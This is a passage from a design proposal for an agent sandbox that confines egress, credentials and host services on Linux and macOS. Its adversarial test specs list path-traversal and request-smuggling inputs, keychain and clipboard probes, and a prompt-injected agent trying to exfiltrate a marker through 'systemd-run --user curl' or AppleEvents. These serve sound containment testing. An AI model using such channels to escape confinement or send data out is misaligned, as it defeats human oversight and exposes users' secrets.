  A socket named by an `allow` rule connects. A socket bound inside the session connects.
- `FW-E2E-077` **Inspected path scope.** With `POST allowed.test/repos/acme/**`:
  - a POST to `/repos/acme/x` passes;
  - a POST to `/repos/other/x` is refused;
  - a GET to `/repos/acme/x` is refused.
- `FW-E2E-078` **Brokered header.** With `broker-credentials = ["anthropic"]` bound to `allowed.test`:
  - the fixture receives the real `x-api-key`;
  - the confined `env` shows only the placeholder, and reading the catalog file is denied;
  - the placeholder sent to `other.test` is refused.
- `FW-E2E-079` **Isolation tier, Linux.** With `isolate = ["pid", "tmp", "procargs"]`:
  - `/proc` lists only session PIDs;
  - `/tmp` starts empty and is not shared with the host;
  - `kill` of a host PID fails.

  On a host without user namespaces the run fails loudly and never starts unisolated.
- `FW-E2E-080` **Isolation tier, macOS.** With the same request:
  - `kill` and `proc_pidinfo` of a host PID fail;
  - `sysctl kern.procargs2.<host pid>` fails;
  - `TMPDIR` and `confstr(_CS_DARWIN_USER_TEMP_DIR)` resolve to paths inside the session;
  - a write to the shared per-user temp dir fails.

  The report's `pid` verdict matches what `ps` can still see.
- `FW-E2E-081` **Host-service channels, macOS.** Under the default profile, each of these fails, and
  none produces a process or network connection outside the sandbox:
  - `open https://allowed.test/`
  - `osascript -e 'tell application "Finder" to get name'`
  - `pbpaste`
  - `security find-generic-password -s fw-test -w` (against a test item created unprompted)
  - `launchctl submit -l fw.test -- /usr/bin/true`

  With `allow-credentials = ["macos-keychain"]`, the `security` probe succeeds, and nothing else
  changes.
- `FW-E2E-082` **Host-service channels, Linux.** On a host with a user session, under supervised
  connect, each of these fails:
  - `systemd-run --user /usr/bin/true`
  - `gdbus call --session` to `org.freedesktop.secrets`
  - `xdg-open`
  - a connect to the X11 or Wayland socket

  With `allow-credentials = ["secret-service"]`, the Secret Service call succeeds.
- `FW-E2E-083` **Privileged interfaces, macOS.** Each fails under the default profile:
  - `IOServiceOpen` on a camera-class service;
  - `host_get_special_port`;
  - `task_for_pid` on a host PID.

  A standard toolchain run ([FW-E2E-020](../formwork.md#fw-e2e-020)..023) still passes.
- `FW-ADV-016` **Gateway frame bypass (D6).** A batch array, a non-JSON frame, and an id-less
  `tools/call` for a shaded tool each fail to reach the backend.
- `FW-ADV-017` **Path traversal against an inspected rule.** Against `allowed.test/repos/acme/**`,
  each of these is refused or canonicalizes outside the scope:
  - `/repos/acme/../other/x`
  - `/repos/acme/%2e%2e/other/x`
  - `/repos/acme%2F..%2Fother/x`
  - a `Content-Length` + `Transfer-Encoding` smuggle
- `FW-ADV-018` **Supervisor race (Linux).** A multithreaded target rewrites its `sockaddr` from a
  second thread while `connect()` is pending. Pass: the connection lands only where the supervisor's
  copy was allowed.
- `FW-ADV-019` **Endpoint theft (macOS).** An unconfined same-uid process that knows `P` and the
  proxy credential connects to the Gateway listener. Pass: refused by the peer-PID check, or, if the
  spike finds the peer check unreliable, the report says `Partial` and names this exact residual.
- `FW-ADV-020` **Exfiltration through a host service.** A prompt-injected agent under
  `AllowHosts(["allowed.test"])` tries to send a marker to `blocked.test` by each §3.4 channel
  (URL open, AppleEvent to a browser or terminal, `systemd-run --user curl`, clipboard hand-off).
  Pass: the marker never reaches the blocked fixture, on either platform.

---

## 5. Parity after this FEP

| Capability | Omnigent Linux | Omnigent macOS | Formwork Linux after | Formwork macOS after |
|---|---|---|---|---|
| Mandatory egress host allowlist | Enforced (netns) | Enforced (SBPL) | Enforced (supervisor) | Enforced (SBPL + authenticated listener; `Partial` if the peer check fails the spike) |
| Method/path rules | Enforced, not canonicalized | Same | Enforced, canonicalized | Enforced for env-trust clients; Security.framework clients fail closed |
| Credential injection | `Authorization` only; CA key on disk | Same | Any header scheme; ephemeral CA; floor still holds | Same, with the client-trust caveat |
| Private IP / metadata block | Enforced | Enforced | Enforced under `AllowHosts` ([FW-EGR4](fep-1.md#fw-egr4)) | Same |
| UDP / local resolver | Closed | Closed | Closed under `AllowHosts`; reported under `Ports` | Closed under `AllowHosts`; resolver reported under `Ports` |
| Pathname AF_UNIX | Unmounted, so unreachable | Denied | Mediated (supervisor) | Enforced (literals) |
| Host-service channels (G7) | Closed | AppleEvents/`lsopen` presumed closed; mach services open | Closed under supervised connect; `Partial` otherwise | Closed (named denies), keychain via the Catalog |
| Privileged interfaces (G6) | seccomp | Not granted | seccomp (unchanged) | Denied, IOKit allowlist |
| Other processes' env (G8) | Hidden | Open (`sysctl-read` allowed) **(spike)** | Blocked (Landlock, verified) | Blocked (`kern.procargs2` deny) |
| Process visibility (G5) | PID namespace | Self-only signal/info | Opt-in tier (namespaces) | Opt-in tier (target/sysctl filters) |
| Private `/tmp` | tmpfs | Scratch dir | tmpfs (tier) or directory-based | Directory-based, including `$DARWIN_USER_TEMP_DIR` |
| Runs without user namespaces | No | n/a | Yes, except `isolate` | n/a |
| Windows | Job Object only | — | Not provided (non-goal) | — |
| ENOENT invisibility | Yes | No | No (non-goal) | No (non-goal) |

On macOS, after this FEP, Formwork is at or above Omnigent's Seatbelt backend on every row:
- Omnigent allows every `mach-lookup` and `sysctl-read`, so its pasteboard, keychain, launchd and
  `kern.procargs2` channels stay open.
- Formwork closes them and keeps the base transparent.
- The two remaining macOS differences — violation latency, and inspection for Security.framework
  clients — apply equally to Omnigent.

On Linux, Formwork reaches Omnigent's properties without bubblewrap, except process isolation on
hosts that lack user namespaces. The evaluation's stacked arrangement (Option B) is still available.

---

## 6. Surface changes (each measured against Growth)

- **Blueprint schema.**
  - **Host rules:** FEP-1's `AllowHosts([HostPattern])` becomes `AllowHosts([HostRule])`, where a
    `HostRule` is a `HostPattern` with optional `methods` and `paths`. A bare string still parses as
    a host-only rule (expand → migrate → contract).
  - **`broker-credentials`:** a list of catalog types, the typed complement of `allow-credentials`.
    A type listed in both is a compile error.
  - **`isolate`:** a subset of `["pid", "ipc", "tmp", "procargs"]`. The same vocabulary on both
    backends, which map it to their own mechanisms. Making it automatic was rejected: process
    isolation is visible to tools.
  - **`allow` on a channel name:** lifts one §3.4 channel. It reuses the existing verb; a channel
    name is written `service:<name>` (for example `allow:service:com.apple.pasteboard.1`), and
    `explain` resolves it. A new verb was considered and rejected. The `service:` prefix is a new
    sigil-like token at the parse edge, which is a Vocabulary amendment (§7).
- **Catalog.**
  - An optional `broker` block (`hosts`, `scheme`).
  - A `services` location kind (mach names on macOS; bus names and socket paths on Linux).
  - The `macos-keychain` and `secret-service` types.

  This is embedded data, so it needs a catalog version bump.
- **Default profile.** Gains the §3.4 baselines (`FW-ISO13`–15) and the `kern.procargs2` deny
  (`FW-ISO16`). Each addition is checked against [FW-E2E-020](../formwork.md#fw-e2e-020)..023 on
  real macOS before it ships in the default. Any addition that breaks a standard toolchain moves to
  `strict`, and its report line says `Partial`.
- **Dependencies** (the constitution's hardest no).
  - Inspection needs `rustls`, `rcgen` and `hyper`, all confined to `formwork-gateway`, which is
    already the tokio layer. The TLS stack is justified because the method and path rules of G1, and
    G2, cannot be expressed without it. `rustls` rather than OpenSSL keeps the trust base
    memory-safe.
  - The Linux supervisor needs no new crate. It uses raw `seccomp(2)` with
    `SECCOMP_FILTER_FLAG_NEW_LISTENER`, beside the existing `seccompiler` baseline.
  - The macOS peer check uses `libproc`, through the existing `libc` bindings.
- **CLI.** No new subcommand.
  - `explain` gains verdicts for socket paths, host rules and channels.
  - `run` gains `--gateway <socket>` for `AllowHosts` under `confine-self` (§3.1). It was accepted
    over the alternative of making that combination permanently `Unenforceable`, because embedders
    such as Omnigent already run their own long-lived broker.
- **Embedding.**
  - `--blueprint -`: read the blueprint from stdin.
  - Publish the release binaries (macOS arm64/x86_64 and Linux) as platform wheels, following the
    `ruff`/`uv` pattern, so a Python orchestrator can depend on them. `py/` stays dev-only.
  - The macOS wheels depend on the Developer ID signing and notarization already tracked for
    releases. An unsigned binary a wheel installs is still quarantined when the wheel was fetched by
    a browser, and runs when fetched by `pip`.

---

## 7. Proposed amendments to the landed docs (apply on landing)

- **`docs/fep-1.md` Non-goals.** Replace the TLS-interception and credential-masking bullets with a
  pointer to FEP-5 §3.2, which states the requirement that reopened them.
- **`formwork.md` §3 threat model.** Add to the in-scope list: "A confined process causing a process
  outside its session to act on its behalf — execute, open a URL, perform egress, or disclose a
  secret — through a host service (AppleEvents, LaunchServices, launchd, the session bus,
  display-server sockets)." This is the threat that `FW-INV14` covers.
- **`formwork.md` §9 platform matrix and fidelity table.**
  - Add a macOS bullet listing the §3.4 SBPL operations.
  - Add a Linux bullet for the supervisor.
  - Add fidelity rows for each `FW-FID8` line.
  - Copy the §3.5 asymmetry table.
  - Correct the Linux UDP and AF_UNIX rows (D4/D5) and the macOS resolver row (D8).
- **`formwork.md` §5.3.** Reword [FW-ISO8](../formwork.md#fw-iso8) from "On Linux, …" to cover
  both backends: seccomp and `NO_NEW_PRIVS` on Linux, the §3.4 SBPL baselines on macOS.
- **`formwork.md` §11.**
  - Close "fd-minting default" (on-demand, through the supervisor on Linux; a static endpoint on
    macOS).
  - Close "Credential brokering" (FEP-5 §3.2).
  - Narrow "Linux gateway egress isolation build-vs-buy" to the optional namespace path.
- **`constitution.md` Vocabulary.**
  - **broker**: the Gateway presenting a credential it holds on the agent's behalf, never
    disclosing its bytes.
  - **placeholder**: the per-session stand-in value for a brokered env var.
  - **inspect**: TLS termination at the Gateway for a host rule that needs request-level policy.
  - **supervise**: the Gateway receiving a confined `connect()` through seccomp user notification
    and minting the connection itself.
  - **channel**: a host service that can act outside the sandbox on a confined process's behalf,
    named `service:<name>` in rules.

---

## 8. Open questions

### 8.1 macOS verification spike (gates every **(spike)** mark)

This runs on real macOS (arm64, current and previous major release). Each item records the observed
behavior as a test fixture, per the constitution's Testing rule on the least convenient realistic
shape.

1. **SBPL remote filters:** does `(remote tcp "<ip>:<port>")` accept only `*` and `localhost`? This
   settles `FW-EGR8`'s endpoint shape.
2. **Peer lookup:** is the `PROC_PIDFDSOCKETINFO` peer-PID lookup reliable under connection churn,
   and how quickly does it resolve? Can a reparented descendant be attributed to the session?
   (`FW-EGR9`; this decides between `Enforced` and `Partial`.)
3. **Channel services:** the exact `mach-lookup` names behind `open`, `osascript`, `pbpaste`,
   `security`, `launchctl submit`, `screencapture` and camera/audio access. Collected by running each
   under a sandbox that logs denials.
4. **`lsopen` and `appleevent-send`:** are they checked for a process sandboxed through
   `sandbox_init`, as opposed to an App Sandbox container? Does Omnigent's `(deny default)` close
   them?
5. **Process information:** does `kern.procargs2` return same-uid environments under
   `(allow default)`, and does a `sysctl-name` deny close it? Which MIBs does `ps` use?
6. **`process-info*` / `signal` re-allows:** the `(target …)` forms that keep a session's own
   subprocess management working (shell job control, `node` child processes, `make -j`).
7. **POSIX IPC:** can `ipc-posix-name-prefix` filters express a session prefix without breaking
   Python `multiprocessing` and Node workers?
8. **Transparency:** run the §3.4 baseline and the `iokit-open` allowlist against the
   [FW-E2E-020](../formwork.md#fw-e2e-020)..023 toolchains, plus Xcode command-line tools, Homebrew,
   `swift build` and `gh`.

### 8.2 Other open questions

- **HTTP/2 on inspected hosts.** Offer HTTP/1.1 only through ALPN, or add an h2 codec? Decided by a
  spike against the model-API clients Formwork wraps.
- **Per-process trust on macOS.** Security.framework clients ignore env-var trust stores. The
  candidates each have a cost:
  - a per-session keychain in the process's search list (the list is per-user and global);
  - `SecTrustSettings` scoped per process (does not exist);
  - leaving inspection off for such clients (the current proposal).

  Revisit if a brokered type's primary client is a platform-verifier client that users cannot
  replace.
- **Request-signing credentials.** AWS SigV4 and GCP token minting need a signer in the Gateway.
  Deferred; until then these types stay floor-denied or excluded.
- **Placeholders in request bodies.** Substitution is limited to the scheme's header.
- **Transparent mode.** On Linux the supervisor could redirect any allowed `connect()`, which would
  remove the need for proxy variables, but it needs a DNS answer path. macOS has no equivalent
  without a Network Extension.
- **Network Extension on macOS.** A `NETransparentProxyProvider` or content filter would give
  per-process egress attribution and transparent mode. It requires a signed system extension, a
  specific entitlement, and user approval. Recorded as the macOS path to parity with Linux on
  violation latency and transparent mode; not proposed while releases are unsigned.
- **Namespace-tier init (Linux).** A forked Formwork process, or the launcher re-parented. The
  pre-exec code does not allocate, which constrains the choice.
- **`(deny default)` base on macOS.** Rejected for the default profile on transparency grounds
  ([FW-TRA2](../formwork.md#fw-tra2)). It is a candidate for `strict` once §8.1 item 3 yields a
  complete `mach-lookup` allowlist for common toolchains.
- **`sandbox_init` deprecation.** The API is deprecated but still shipped, and the macOS agent
  ecosystem depends on it. If Apple removes it, the replacement is Endpoint Security (authorization
  events, which need an entitlement) or App Sandbox containers (which do not fit arbitrary CLI tool
  trees). The Compiler/Confiner split keeps that change confined to one crate.
- **Landlock pathname-socket scoping.** If a future Landlock ABI mediates pathname AF_UNIX
  `connect()`, `FW-ISO12` and `FW-ISO15` move from the supervisor to Landlock, and the supervisor
  keeps only egress.
